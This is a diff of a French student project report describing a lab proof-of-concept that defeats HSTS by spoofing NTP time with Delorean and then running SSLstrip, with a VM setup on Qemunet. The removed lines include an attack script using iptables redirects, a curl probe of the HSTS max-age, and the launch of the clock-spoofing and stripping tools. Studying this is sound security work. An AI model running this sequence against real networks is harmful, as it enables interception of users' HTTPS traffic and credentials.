@@ -23,70 +23,24 @@ Dans ce projet de TER, nous avons eu à réaliser un Proof-Of-Concept de cette a
 
 \subsection{Mise en place de l'environnement}
 
-L'environnement de test utilise l'outil Qemunet et est constitué de trois machines virtuelles. Nous avons la machine cliente et victime nommée grave. Ensuite, immortal, la machine de l'attaquant et positionnée en homme du milieu. Finalement, la machine opeth joue le rôle de serveur web hébergeant les deux domaines \path{www.opeth.local} et \path{www.opeth.secure}. Cette dernière machine joue également le rôle du serveur NTP, même si dans la réalité les deux serveurs se trouvent généralement sur des machines différentes.
+Pour résoudre les différents domaines, nous utilisons le fichier \path{/etc/hosts} de chaque machine.
 
-Pour configurer chaque machine, nous utilisons le script \path{start.sh} présent dans le dossier de chaque machine virtuelle. Ce fichier est lancé au démarrage et permet de configurer les différents services pour la démonstration.
+\subsubsection{Configuration de la machine serveur - opeth}
 
-\subsubsection{Machine grave (147.210.13.2)}
+Pour cette attaque, nous avons ajouté un serveur NTP légitime sur la machine \textbf{opeth}, à travers l'outil ntpd. La configuration de base était suffisante pour notre démonstration. À noter que dans la réalité, le serveur NTP aurait été probablement sur une machine différente.
 
-Il s'agit de la machine cliente et victime. Celle-ci utilise l'environnement graphique de la distribution Linux Alpine et le navigateur firefox est utilisé pour la démonstration.
+Concernant le serveur web NGINX, celui-ci utilise les deux domaines \path{www.opeth.local} et \path{www.opeth.secure}. Le premier est accédé en HTTP alors que le second en HTTPS et protégé grâce à HSTS.
 
-Au lancement de la machine, le certificat de notre autorité de certification est ajouté à firefox grâce à l'outil certutil. De plus, un client NTP (sntpc) est lancé au démarrage de la machine et configuré pour effectuer ses requêtes vers opeth de manière régulière (toutes les secondes pour les besoins de la démonstration).
+\subsubsection{Configuration de la machine cliente - grave}
 
-\subsubsection{Machine opeth (147.210.12.1)}
+Il a fallut utiliser un client NTP sur cette machine pour cette attaque. Nous utilisons donc sntpc (Simple NTP Client), que l'on lance au démarrage de la machine et que l'on configure pour effectuer ses requêtes vers \textbf{opeth} de manière régulière (toutes les secondes pour les besoins de la démonstration).
 
-Cette machine héberge un serveur HTTP(s) Nginx sur le port 80 et 443. Le certificat utilisé pour les connections HTTPS a été généré avec openssl grâce aux scripts présents dans le dossier \path{CA}, et signé par notre autorité de certification par ce script :
 
-\begin{minted}{bash}
-#!/bin/sh
+\subsubsection{Configuration de la machine attaquante - immortal}
 
-if test ! -f root-ca.pem || test ! -f root-ca.key
-then
-    echo "[-] First, create CA !"
-    exit 1
-fi
+C'est sur cette machine que se trouve le Proof-Of-Concept de l'attaque. Nous avons également utilisé le script Delorean \cite{delorean} comme décrit dans le papier de l'attaque afin d'usurper les requêtes NTP de la machine grave. L'attaque se lance grâce au script \path{/mnt/host/attack.sh} :
 
-# Create private key
-openssl genrsa -out cert.key 4096
-
-# Create request
-openssl req -new -key cert.key -out cert.csr
-
-# Sign certificate with CA
-openssl x509 -req -in cert.csr -CA root-ca.pem -CAkey root-ca.key -CAcreateserial -out cert.pem -days 365 -sha256
-
-echo "[+] Your certificate: cert.pem"
-echo "[+] Your private key: cert.key"
-\end{minted}
-
-Sur le serveur Nginx, nous avons configuré un domaine en HTTP (\path{www.opeth.local}), ainsi qu'un domaine en HTTPS (\path{www.opeth.secure}), sécurisé grâce à HSTS. La configuration de ce dernier se fait en rajoutant la ligne suivante dans le fichier de configuration de Nginx :
-
-\begin{minted}{text}
-  add_header Strict-Transport-Security "max-age=31536000; includeSubDomains";
-\end{minted}
-
-Cette machine héberge également un serveur NTP. Nous avons simplement eu à installer le paquet ntpd pour que celui-ci soit lancé au démarrage.
-
-\subsubsection{Machine immortal (147.210.12.2 - 147.210.13.1)}
-
-C'est sur cette machine que se trouve le Proof-Of-Concept de l'attaque. Nous avons également utilisé le script Delorean (\url{https://github.com/PentesterES/Delorean}) comme décrit dans le papier de l'attaque afin d'usurper les requêtes NTP de la machine grave. L'attaque se lance grâce au script \path{/mnt/host/attack.sh} :
-
-\begin{minted}{bash}
-#!/bin/sh
-
-PROXY_PORT=4242
-DELOREAN_PORT=4343
-
-iptables -t nat -F
-iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $PROXY_PORT
-iptables -t nat -A PREROUTING -p udp --destination-port 123 -j REDIRECT --to-port $DELOREAN_PORT
-
-hsts_expire=$(curl -v https://www.opeth.secure --insecure 2>&1  | grep Strict | awk -F= '{print $2}' | awk -F\; '{print $1}')
-hsts_expire=$(($hsts_expire / 60 + 1))
-
-/mnt/host/delorean.py -p $DELOREAN_PORT -n -s ${hsts_expire}m &
-/mnt/host/sslstrip-ntp.py $PROXY_PORT
-\end{minted}
+\inputminted[bgcolor=lbcolor, breaklines]{php}{../sslstrip-ntp/immortal/attack.sh}
 
 Nous commençons par rediriger les requêtes HTTP sur le port de notre proxy, puis les requêtes NTP vers le port de Delorean. Nous calculons ensuite le temps d'expiration des entrées HSTS à l'aide de l'outil curl. Finalement, nous lançons le serveur Delorean ainsi que notre proxy implémentant l'attaque SSLstrip.
 
